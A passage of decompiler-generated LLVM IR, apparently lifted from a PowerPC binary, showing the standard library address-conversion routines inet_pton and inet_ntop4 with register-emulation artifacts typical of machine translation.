  %v2_10009cd8 = load i8, i8* %v1_10009cd8, align 1
  %v3_10009cd8 = zext i8 %v2_10009cd8 to i32
  store i32 %v3_10009cd8, i32* %r11.global-to-local, align 4
  %v3_10009cdc = icmp eq i32 %v0_10009cdc, 0
  store i1 %v3_10009cdc, i1* %cr4_eq.global-to-local, align 1
  %v1_10009ce0 = add i32 %v0_10009ce0, 1
  store i32 %v1_10009ce0, i32* %r3.global-to-local, align 4
  %v3_10009ce4 = icmp eq i8 %v2_10009cd8, 0
  store i1 %v3_10009ce4, i1* %cr7_eq.global-to-local, align 1
  %v1_10009ce8 = add nsw i32 %v3_10009cd8, -48
  store i32 %v1_10009ce8, i32* %r0.global-to-local, align 4
  %v2_10009cec = icmp ugt i32 %v1_10009ce8, 9
  store i1 %v2_10009cec, i1* %cr6_gt.global-to-local, align 1
  %v3_10009cf0 = icmp eq i8 %v2_10009cd8, 46
  store i1 %v3_10009cf0, i1* %cr1_eq.global-to-local, align 1
  %v0_10009cf4 = load i4, i4* @cr4, align 1
  %v1_10009cf4 = call %2 @__asm_mcrf_cr0_write(i4 %v0_10009cf4)
  %v4_10009cf4 = extractvalue %2 %v1_10009cf4, 2
  store i1 %v4_10009cf4, i1* %cr0_eq.global-to-local, align 1
  %v0_10009cf8 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v0_10009cfc = load i32, i32* %r10.global-to-local, align 4
  br i1 %v0_10009cf8, label %dec_label_pc_10009cfc, label %dec_label_pc_10009c88

dec_label_pc_10009cfc:                            ; preds = %dec_label_pc_10009cd8
  %v3_10009cfc = icmp eq i32 %v0_10009cfc, 3
  store i1 %v3_10009cfc, i1* %cr7_eq.global-to-local, align 1
  %tmp9 = icmp slt i32 %v0_10009cfc, 4
  br i1 %tmp9, label %dec_label_pc_10009d20, label %dec_label_pc_10009d04

dec_label_pc_10009d04:                            ; preds = %dec_label_pc_10009cfc
  store i32 %arg1, i32* @r3, align 4
  store i32 4, i32* @r5, align 4
  store i32 %v2_10009c6c, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009d14.467 to i32), i32* @lr, align 4
  %v0_10009d10 = call i32 @memcpy()
  br label %dec_label_pc_10009d20

dec_label_pc_10009d20:                            ; preds = %dec_label_pc_10009cc4, %dec_label_pc_10009c90, %dec_label_pc_10009cb0, %dec_label_pc_10009cfc, %dec_label_pc_10009d04
  %storemerge = phi i32 [ 1, %dec_label_pc_10009d04 ], [ 0, %dec_label_pc_10009cfc ], [ 0, %dec_label_pc_10009cb0 ], [ 0, %dec_label_pc_10009c90 ], [ 0, %dec_label_pc_10009cc4 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i32 %v0_10009c70, i32* %r0.global-to-local, align 4
  %v1_10009d30 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10009c60)
  %v4_10009d30 = extractvalue %0 %v1_10009d30, 2
  store i1 %v4_10009d30, i1* %cr0_eq.global-to-local, align 1
  %v9_10009d30 = extractvalue %0 %v1_10009d30, 7
  store i4 %v9_10009d30, i4* @cr4, align 1
  %v0_10009d34 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10009d34

; uselistorder directives
  uselistorder i32 %v1_10009cb0, { 1, 0, 2 }
  uselistorder i32 %v1_10009c9c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10009c60, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder i1* %cr6_gt.global-to-local, { 1, 0 }
  uselistorder i1* %cr4_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr1_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr0_eq.global-to-local, { 0, 2, 1 }
  uselistorder i32 255, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10009d20, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10009cd8.backedge, { 0, 2, 1 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_10009d38 = icmp eq i32 %arg1, 2
  %v0_10009d3c = load i32, i32* @lr, align 4
  store i32 %v0_10009d3c, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  store i32 %arg3, i32* @r22, align 4
  br i1 %v3_10009d38, label %dec_label_pc_10009d64, label %dec_label_pc_10009d58

dec_label_pc_10009d58:                            ; preds = %entry
  %v3_10009d58 = icmp eq i32 %arg1, 10
  br i1 %v3_10009d58, label %dec_label_pc_10009d78, label %dec_label_pc_10009f14

dec_label_pc_10009d64:                            ; preds = %entry
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268475760, i32* @lr, align 4
  %v3_10009d6c = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  store i32 %v3_10009d6c, i32* %r3.global-to-local, align 4
  store i32 %v3_10009d6c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009f2c

dec_label_pc_10009d78:                            ; preds = %dec_label_pc_10009d58
  %v2_10009d78 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10009d78, i32* %r3.global-to-local, align 4
  store i32 268475784, i32* @lr, align 4
  %v3_10009d84 = call i32 @__GI_memset(i32 %v2_10009d78, i32 0, i32 16)
  store i32 %v3_10009d84, i32* %r3.global-to-local, align 4
  %v0_10009d88 = load i32, i32* @r29, align 4
  %v1_10009d88 = inttoptr i32 %v0_10009d88 to i8*
  %v2_10009d88 = load i8, i8* %v1_10009d88, align 1
  %v3_10009d88 = zext i8 %v2_10009d88 to i32
  store i32 %v3_10009d88, i32* %r0.global-to-local, align 4
  store i32 %v3_10009d84, i32* @r31, align 4
  %v2_10009d90 = add i32 %v3_10009d84, 16
  store i32 %v2_10009d90, i32* @r27, align 4
  %v3_10009d94 = icmp eq i8 %v2_10009d88, 58
  br i1 %v3_10009d94, label %dec_label_pc_10009d9c, label %dec_label_pc_10009da8

dec_label_pc_10009d9c:                            ; preds = %dec_label_pc_10009d78
  %v1_10009d9c = add i32 %v0_10009d88, 1
  %v2_10009d9c = inttoptr i32 %v1_10009d9c to i8*
  %v3_10009d9c = load i8, i8* %v2_10009d9c, align 1
  %v4_10009d9c = zext i8 %v3_10009d9c to i32
  store i32 %v4_10009d9c, i32* %r0.global-to-local, align 4
  store i32 %v1_10009d9c, i32* @r29, align 4
  %v3_10009da0 = icmp eq i8 %v3_10009d9c, 58
  br i1 %v3_10009da0, label %dec_label_pc_10009da8, label %dec_label_pc_10009f28

dec_label_pc_10009da8:                            ; preds = %dec_label_pc_10009d9c, %dec_label_pc_10009d78
  %v0_10009da8 = phi i32 [ %v1_10009d9c, %dec_label_pc_10009d9c ], [ %v0_10009d88, %dec_label_pc_10009d78 ]
  store i32 %v0_10009da8, i32* @r26, align 4
  store i32 0, i32* @r24, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_10009e7c3036 = inttoptr i32 %v0_10009da8 to i8*
  %v2_10009e7c3137 = load i8, i8* %v1_10009e7c3036, align 1
  %v3_10009e7c3238 = zext i8 %v2_10009e7c3137 to i32
  store i32 %v3_10009e7c3238, i32* %r3.global-to-local, align 4
  store i32 268476036, i32* @lr, align 4
  %v1_10009e803339 = call i32 @__GI_tolower(i32 %v3_10009e7c3238)
  store i32 %v1_10009e803339, i32* %r3.global-to-local, align 4
  store i32 %v1_10009e803339, i32* @r30, align 4
  %v3_10009e843440 = icmp eq i32 %v1_10009e803339, 0
  br i1 %v3_10009e843440, label %dec_label_pc_10009e8c, label %dec_label_pc_10009db4.lr.ph

dec_label_pc_10009db4:                            ; preds = %dec_label_pc_10009db4.lr.ph, %dec_label_pc_10009e7c.backedge
  %v1_10009e8035 = phi i32 [ %v1_10009e803341, %dec_label_pc_10009db4.lr.ph ], [ %v1_10009e80, %dec_label_pc_10009e7c.backedge ]
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1000d008.468 to i32), i32* @r25, align 4
  %v0_10009dc0 = load i32, i32* @r29, align 4
  %v1_10009dc0 = add i32 %v0_10009dc0, 1
  store i32 %v1_10009dc0, i32* @r29, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1000d008.468 to i32), i32* @r3, align 4
  store i32 268475852, i32* @lr, align 4
  %v3_10009dc8 = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_1000d008.468 to i32), i32 %v1_10009e8035)
  store i32 %v3_10009dc8, i32* %r3.global-to-local, align 4
  %v3_10009dcc = icmp eq i32 %v3_10009dc8, 0
  br i1 %v3_10009dcc, label %dec_label_pc_10009dec, label %dec_label_pc_10009dd4

dec_label_pc_10009dd4:                            ; preds = %dec_label_pc_10009db4
  %v0_10009dd4 = load i32, i32* @r25, align 4
  %v2_10009dd4 = sub i32 %v3_10009dc8, %v0_10009dd4
  store i32 %v2_10009dd4, i32* %r0.global-to-local, align 4
  %v0_10009dd8 = load i32, i32* @r28, align 4
  %v1_10009dd8 = mul i32 %v0_10009dd8, 16
  store i32 %v1_10009dd8, i32* %r9.global-to-local, align 4
  %v2_10009ddc = or i32 %v1_10009dd8, %v2_10009dd4
  store i32 %v2_10009ddc, i32* @r28, align 4
  %tmp19 = icmp ult i32 %v2_10009ddc, 65536
  br i1 %tmp19, label %dec_label_pc_10009e78, label %dec_label_pc_10009f28

dec_label_pc_10009dec:                            ; preds = %dec_label_pc_10009db4
  %v0_10009dec = load i32, i32* @r30, align 4
  %v3_10009dec = icmp eq i32 %v0_10009dec, 58
  br i1 %v3_10009dec, label %dec_label_pc_10009df4, label %dec_label_pc_10009e48

dec_label_pc_10009df4:                            ; preds = %dec_label_pc_10009dec
  %v0_10009df4 = load i32, i32* @r23, align 4
  %v3_10009df4 = icmp eq i32 %v0_10009df4, 0
  br i1 %v3_10009df4, label %dec_label_pc_10009dfc, label %dec_label_pc_10009e10

dec_label_pc_10009dfc:                            ; preds = %dec_label_pc_10009df4
  %v0_10009dfc = load i32, i32* @r24, align 4
  %v3_10009dfc = icmp eq i32 %v0_10009dfc, 0
  br i1 %v3_10009dfc, label %dec_label_pc_10009e04, label %dec_label_pc_10009f28

dec_label_pc_10009e04:                            ; preds = %dec_label_pc_10009dfc
  %v0_10009e04 = load i32, i32* @r31, align 4
  store i32 %v0_10009e04, i32* @r24, align 4
  %v0_10009e08 = load i32, i32* @r29, align 4
  store i32 %v0_10009e08, i32* @r26, align 4
  br label %dec_label_pc_10009e7c.backedge

dec_label_pc_10009e10:                            ; preds = %dec_label_pc_10009df4
  %v0_10009e10 = load i32, i32* @r29, align 4
  %v1_10009e10 = inttoptr i32 %v0_10009e10 to i8*
  %v2_10009e10 = load i8, i8* %v1_10009e10, align 1
  %v3_10009e10 = zext i8 %v2_10009e10 to i32
  store i32 %v3_10009e10, i32* %r0.global-to-local, align 4
  %v3_10009e14 = icmp eq i8 %v2_10009e10, 0
  br i1 %v3_10009e14, label %dec_label_pc_10009f28, label %dec_label_pc_10009e1c

dec_label_pc_10009e1c:                            ; preds = %dec_label_pc_10009e10
  %v0_10009e1c = load i32, i32* @r31, align 4
  %v1_10009e1c = add i32 %v0_10009e1c, 2
  store i32 %v1_10009e1c, i32* %r0.global-to-local, align 4
  %v1_10009e20 = load i32, i32* @r27, align 4
  %v3_10009e20 = icmp ugt i32 %v1_10009e1c, %v1_10009e20
  br i1 %v3_10009e20, label %dec_label_pc_10009f28, label %dec_label_pc_10009e28

dec_label_pc_10009e28:                            ; preds = %dec_label_pc_10009e1c
  %v0_10009e28 = load i32, i32* @r28, align 4
  %v1_10009e28 = udiv i32 %v0_10009e28, 256
  store i32 %v1_10009e28, i32* %r0.global-to-local, align 4
  %v1_10009e2c = trunc i32 %v0_10009e28 to i8
  %v3_10009e2c = add i32 %v0_10009e1c, 1
  %v4_10009e2c = inttoptr i32 %v3_10009e2c to i8*
  store i8 %v1_10009e2c, i8* %v4_10009e2c, align 1
  %v0_10009e30 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009e30 = trunc i32 %v0_10009e30 to i8
  %v2_10009e30 = load i32, i32* @r31, align 4
  %v3_10009e30 = inttoptr i32 %v2_10009e30 to i8*
  store i8 %v1_10009e30, i8* %v3_10009e30, align 1
  %v0_10009e34 = load i32, i32* @r29, align 4
  store i32 %v0_10009e34, i32* @r26, align 4
  %v0_10009e38 = load i32, i32* @r31, align 4
  %v1_10009e38 = add i32 %v0_10009e38, 2
  store i32 %v1_10009e38, i32* @r31, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_10009e7c30 = inttoptr i32 %v0_10009e34 to i8*
  %v2_10009e7c31 = load i8, i8* %v1_10009e7c30, align 1
  %v3_10009e7c32 = zext i8 %v2_10009e7c31 to i32
  store i32 %v3_10009e7c32, i32* %r3.global-to-local, align 4
  store i32 268476036, i32* @lr, align 4
  %v1_10009e8033 = call i32 @__GI_tolower(i32 %v3_10009e7c32)
  store i32 %v1_10009e8033, i32* %r3.global-to-local, align 4
  store i32 %v1_10009e8033, i32* @r30, align 4
  %v3_10009e8434 = icmp eq i32 %v1_10009e8033, 0
  br i1 %v3_10009e8434, label %dec_label_pc_10009e8c, label %dec_label_pc_10009db4.lr.ph

dec_label_pc_10009db4.lr.ph:                      ; preds = %dec_label_pc_10009da8, %dec_label_pc_10009e28
  %v1_10009e803341 = phi i32 [ %v1_10009e8033, %dec_label_pc_10009e28 ], [ %v1_10009e803339, %dec_label_pc_10009da8 ]
  br label %dec_label_pc_10009db4

dec_label_pc_10009e48:                            ; preds = %dec_label_pc_10009dec
  %v3_10009e48 = icmp eq i32 %v0_10009dec, 46
  br i1 %v3_10009e48, label %dec_label_pc_10009e50, label %dec_label_pc_10009f28

dec_label_pc_10009e50:                            ; preds = %dec_label_pc_10009e48
  %v0_10009e50 = load i32, i32* @r31, align 4
  %v1_10009e50 = add i32 %v0_10009e50, 4
  store i32 %v1_10009e50, i32* @r30, align 4
  %v1_10009e54 = load i32, i32* @r27, align 4
  %v3_10009e54 = icmp ugt i32 %v1_10009e50, %v1_10009e54
  br i1 %v3_10009e54, label %dec_label_pc_10009f28, label %dec_label_pc_10009e5c

dec_label_pc_10009e5c:                            ; preds = %dec_label_pc_10009e50
  %v0_10009e60 = load i32, i32* @r26, align 4
  store i32 %v0_10009e60, i32* %r3.global-to-local, align 4
  store i32 268476008, i32* @lr, align 4
  %v3_10009e64 = call i32 @inet_pton4(i32 %v0_10009e60, i32 %v0_10009e50)
  store i32 %v3_10009e64, i32* %r3.global-to-local, align 4
  %v0_10009e68 = load i32, i32* @r30, align 4
  store i32 %v0_10009e68, i32* @r31, align 4
  %v2_10009e6c = icmp sgt i32 %v3_10009e64, 0
  br i1 %v2_10009e6c, label %dec_label_pc_10009eb0, label %dec_label_pc_10009f28

dec_label_pc_10009e78:                            ; preds = %dec_label_pc_10009dd4
  store i32 1, i32* @r23, align 4
  %v0_10009e7c.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10009e7c.backedge

dec_label_pc_10009e7c.backedge:                   ; preds = %dec_label_pc_10009e78, %dec_label_pc_10009e04
  %v0_10009e7c.be = phi i32 [ %v0_10009e7c.pre.pre, %dec_label_pc_10009e78 ], [ %v0_10009e08, %dec_label_pc_10009e04 ]
  %v1_10009e7c = inttoptr i32 %v0_10009e7c.be to i8*
  %v2_10009e7c = load i8, i8* %v1_10009e7c, align 1
  %v3_10009e7c = zext i8 %v2_10009e7c to i32
  store i32 %v3_10009e7c, i32* %r3.global-to-local, align 4
  store i32 268476036, i32* @lr, align 4
  %v1_10009e80 = call i32 @__GI_tolower(i32 %v3_10009e7c)
  store i32 %v1_10009e80, i32* %r3.global-to-local, align 4
  store i32 %v1_10009e80, i32* @r30, align 4
  %v3_10009e84 = icmp eq i32 %v1_10009e80, 0
  br i1 %v3_10009e84, label %dec_label_pc_10009e8c, label %dec_label_pc_10009db4

dec_label_pc_10009e8c:                            ; preds = %dec_label_pc_10009e7c.backedge, %dec_label_pc_10009da8, %dec_label_pc_10009e28
  %v0_10009e8c = load i32, i32* @r23, align 4
  %v3_10009e8c = icmp eq i32 %v0_10009e8c, 0
  %v0_10009ef4.pre.pre = load i32, i32* @r31, align 4
  br i1 %v3_10009e8c, label %dec_label_pc_10009eb0, label %dec_label_pc_10009e94

dec_label_pc_10009e94:                            ; preds = %dec_label_pc_10009e8c
  %v1_10009e94 = add i32 %v0_10009ef4.pre.pre, 2
  store i32 %v1_10009e94, i32* %r0.global-to-local, align 4
  %v1_10009e98 = load i32, i32* @r27, align 4
  %v3_10009e98 = icmp ugt i32 %v1_10009e94, %v1_10009e98
  br i1 %v3_10009e98, label %dec_label_pc_10009f28, label %dec_label_pc_10009ea0

dec_label_pc_10009ea0:                            ; preds = %dec_label_pc_10009e94
  %v0_10009ea0 = load i32, i32* @r28, align 4
  %v1_10009ea0 = udiv i32 %v0_10009ea0, 256
  store i32 %v1_10009ea0, i32* %r0.global-to-local, align 4
  %v1_10009ea4 = trunc i32 %v0_10009ea0 to i8
  %v3_10009ea4 = add i32 %v0_10009ef4.pre.pre, 1
  %v4_10009ea4 = inttoptr i32 %v3_10009ea4 to i8*
  store i8 %v1_10009ea4, i8* %v4_10009ea4, align 1
  %v0_10009ea8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009ea8 = trunc i32 %v0_10009ea8 to i8
  %v2_10009ea8 = load i32, i32* @r31, align 4
  %v3_10009ea8 = inttoptr i32 %v2_10009ea8 to i8*
  store i8 %v1_10009ea8, i8* %v3_10009ea8, align 1
  %v0_10009eac = load i32, i32* @r31, align 4
  %v1_10009eac = add i32 %v0_10009eac, 2
  store i32 %v1_10009eac, i32* @r31, align 4
  br label %dec_label_pc_10009eb0

dec_label_pc_10009eb0:                            ; preds = %dec_label_pc_10009e8c, %dec_label_pc_10009e5c, %dec_label_pc_10009ea0
  %v0_10009ef4.pre = phi i32 [ %v0_10009e68, %dec_label_pc_10009e5c ], [ %v1_10009eac, %dec_label_pc_10009ea0 ], [ %v0_10009ef4.pre.pre, %dec_label_pc_10009e8c ]
  %v0_10009eb0 = load i32, i32* @r24, align 4
  %v3_10009eb0 = icmp eq i32 %v0_10009eb0, 0
  %v1_10009ef4.pre = load i32, i32* @r27, align 4
  %v4_10009ef4 = icmp eq i32 %v0_10009ef4.pre, %v1_10009ef4.pre
  br i1 %v3_10009eb0, label %dec_label_pc_10009ef4, label %dec_label_pc_10009eb8

dec_label_pc_10009eb8:                            ; preds = %dec_label_pc_10009eb0
  %v2_10009ebc = sub i32 %v0_10009ef4.pre, %v0_10009eb0
  store i32 %v2_10009ebc, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v4_10009ef4, label %dec_label_pc_10009f28, label %dec_label_pc_10009edc.preheader

dec_label_pc_10009edc.preheader:                  ; preds = %dec_label_pc_10009eb8
  %v3_10009edc24 = icmp slt i32 %v2_10009ebc, 1
  %v2_10009ee026 = add i32 %v2_10009ebc, -1
  store i32 %v2_10009ee026, i32* %r10.global-to-local, align 4
  %v2_10009ee427 = add i32 %v1_10009ef4.pre, -1
  store i32 2, i32* %r9.global-to-local, align 4
  br i1 %v3_10009edc24, label %dec_label_pc_10009ef4.thread, label %dec_label_pc_10009ed0

dec_label_pc_10009ed0:                            ; preds = %dec_label_pc_10009edc.preheader, %dec_label_pc_10009ed0.dec_label_pc_10009ed0_crit_edge
  %v0_10009ed0 = phi i32 [ %v0_10009ed0.pre, %dec_label_pc_10009ed0.dec_label_pc_10009ed0_crit_edge ], [ %v0_10009eb0, %dec_label_pc_10009edc.preheader ]
  %v2_10009ee429 = phi i32 [ %v2_10009ee4, %dec_label_pc_10009ed0.dec_label_pc_10009ed0_crit_edge ], [ %v2_10009ee427, %dec_label_pc_10009edc.preheader ]
  %v2_10009ee028 = phi i32 [ %v2_10009ee0, %dec_label_pc_10009ed0.dec_label_pc_10009ed0_crit_edge ], [ %v2_10009ee026, %dec_label_pc_10009edc.preheader ]
  %v2_10009ed0 = add i32 %v0_10009ed0, %v2_10009ee028
  %v3_10009ed0 = inttoptr i32 %v2_10009ed0 to i8*
  %v4_10009ed0 = load i8, i8* %v3_10009ed0, align 1
  %v5_10009ed0 = zext i8 %v4_10009ed0 to i32
  store i32 %v5_10009ed0, i32* %r0.global-to-local, align 4
  %v3_10009ed4 = inttoptr i32 %v2_10009ee429 to i8*
  store i8 %v4_10009ed0, i8* %v3_10009ed4, align 1
  %v0_10009ed8 = load i32, i32* %r8.global-to-local, align 4
  %v1_10009ed8 = load i32, i32* @r24, align 4
  %v2_10009ed8 = load i32, i32* %r10.global-to-local, align 4
  %v3_10009ed8 = trunc i32 %v0_10009ed8 to i8
  %v4_10009ed8 = add i32 %v2_10009ed8, %v1_10009ed8
  %v5_10009ed8 = inttoptr i32 %v4_10009ed8 to i8*
  store i8 %v3_10009ed8, i8* %v5_10009ed8, align 1
  %v0_10009edc.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10009edc.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_10009ee4.pre = load i32, i32* @r27, align 4
  %v3_10009edc = icmp slt i32 %v1_10009edc.pre, %v0_10009edc.pre
  %v2_10009ee0 = sub i32 %v1_10009edc.pre, %v0_10009edc.pre
  store i32 %v2_10009ee0, i32* %r10.global-to-local, align 4
  %v1_10009ee8 = add i32 %v0_10009edc.pre, 1
  store i32 %v1_10009ee8, i32* %r9.global-to-local, align 4
  br i1 %v3_10009edc, label %dec_label_pc_10009ef4.thread, label %dec_label_pc_10009ed0.dec_label_pc_10009ed0_crit_edge

dec_label_pc_10009ed0.dec_label_pc_10009ed0_crit_edge: ; preds = %dec_label_pc_10009ed0
  %v2_10009ee4 = sub i32 %v1_10009ee4.pre, %v0_10009edc.pre
  %v0_10009ed0.pre = load i32, i32* @r24, align 4
  br label %dec_label_pc_10009ed0

dec_label_pc_10009ef4.thread:                     ; preds = %dec_label_pc_10009ed0, %dec_label_pc_10009edc.preheader
  %v0_10009ef0.lcssa = phi i32 [ %v1_10009ef4.pre, %dec_label_pc_10009edc.preheader ], [ %v1_10009ee4.pre, %dec_label_pc_10009ed0 ]
  store i32 %v0_10009ef0.lcssa, i32* @r31, align 4
  br label %dec_label_pc_10009efc

dec_label_pc_10009ef4:                            ; preds = %dec_label_pc_10009eb0
  br i1 %v4_10009ef4, label %dec_label_pc_10009efc, label %dec_label_pc_10009f28

dec_label_pc_10009efc:                            ; preds = %dec_label_pc_10009ef4.thread, %dec_label_pc_10009ef4
  %v0_10009efc = load i32, i32* @r22, align 4
  store i32 %v0_10009efc, i32* @r3, align 4
  store i32 %v2_10009d78, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009f0c.469 to i32), i32* @lr, align 4
  %v0_10009f08 = call i32 @memcpy()
  store i32 %v0_10009f08, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009f2c

dec_label_pc_10009f14:                            ; preds = %dec_label_pc_10009d58
  %v0_10009f14 = call i32 @__errno_location()
  store i32 %v0_10009f14, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10009f20 = inttoptr i32 %v0_10009f14 to i32*
  store i32 97, i32* %v2_10009f20, align 4
  %v0_10009f30.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009f2c

dec_label_pc_10009f28:                            ; preds = %dec_label_pc_10009e1c, %dec_label_pc_10009e10, %dec_label_pc_10009dd4, %dec_label_pc_10009dfc, %dec_label_pc_10009eb8, %dec_label_pc_10009e5c, %dec_label_pc_10009e48, %dec_label_pc_10009ef4, %dec_label_pc_10009d9c, %dec_label_pc_10009e94, %dec_label_pc_10009e50
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009f2c

dec_label_pc_10009f2c:                            ; preds = %dec_label_pc_10009f14, %dec_label_pc_10009efc, %dec_label_pc_10009d64, %dec_label_pc_10009f28
  %v0_10009f30 = phi i32 [ %v0_10009f30.pre, %dec_label_pc_10009f14 ], [ 1, %dec_label_pc_10009efc ], [ %v3_10009d6c, %dec_label_pc_10009d64 ], [ 0, %dec_label_pc_10009f28 ]
  store i32 %v0_10009d3c, i32* %r0.global-to-local, align 4
  store i32 %v0_10009f30, i32* %r3.global-to-local, align 4
  ret i32 %v0_10009f30

; uselistorder directives
  uselistorder i32 %v0_10009f30, { 1, 0 }
  uselistorder i32 %v2_10009ee0, { 1, 0 }
  uselistorder i32 %v0_10009edc.pre, { 0, 2, 1, 3 }
  uselistorder i1 %v4_10009ef4, { 1, 0 }
  uselistorder i32 %v0_10009ef4.pre, { 1, 0 }
  uselistorder i32 %v0_10009ea0, { 1, 0 }
  uselistorder i32 %v0_10009ef4.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v1_10009e80, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10009e28, { 1, 0 }
  uselistorder i32 %v1_10009dd8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 7, 8, 9, 13, 14, 10, 11, 2, 1, 12, 4, 3, 15, 16, 17, 18, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_tolower, { 2, 1, 0 }
  uselistorder i32 268476036, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder label %dec_label_pc_10009f2c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10009f28, { 7, 4, 9, 5, 10, 6, 0, 1, 3, 2, 8 }
  uselistorder label %dec_label_pc_10009efc, { 1, 0 }
  uselistorder label %dec_label_pc_10009ed0, { 1, 0 }
  uselistorder label %dec_label_pc_10009eb0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009e8c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10009db4.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10009db4, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10009f9c.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i16, align 2
  %stack_var_-54 = alloca i32, align 4
  %v0_10009f44 = load i32, i32* @lr, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r5.global-to-local, align 4
  %v2_10009f70 = ptrtoint i32* %stack_var_-54 to i32
  store i32 %v2_10009f70, i32* %r3.global-to-local, align 4
  store i32 100, i32* @r28, align 4
  store i16 0, i16* %stack_var_-56, align 2
  store i32 ptrtoint (i32* @global_var_10009f80.472 to i32), i32* @lr, align 4
  %v3_10009f7c = call i32 @__GI_memset(i32 %v2_10009f70, i32 0, i32 15)
  store i32 %v3_10009f7c, i32* %r3.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 46, i32* %r12.global-to-local, align 4
  %v0_1000a0402 = load i32, i32* @r1, align 4
  store i32 %v0_1000a0402, i32* %r7.global-to-local, align 4
  store i32 4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10009f9c

dec_label_pc_10009f9c:                            ; preds = %dec_label_pc_1000a010.dec_label_pc_10009f9c_crit_edge, %dec_label_pc_10009f9c.lr.ph
  %v2_10009fbc = phi i32 [ %v2_1000a040, %dec_label_pc_1000a010.dec_label_pc_10009f9c_crit_edge ], [ %v0_1000a0402, %dec_label_pc_10009f9c.lr.ph ]
  %v0_10009fb0 = phi i32 [ %v0_1000a040, %dec_label_pc_1000a010.dec_label_pc_10009f9c_crit_edge ], [ %v0_1000a0402, %dec_label_pc_10009f9c.lr.ph ]
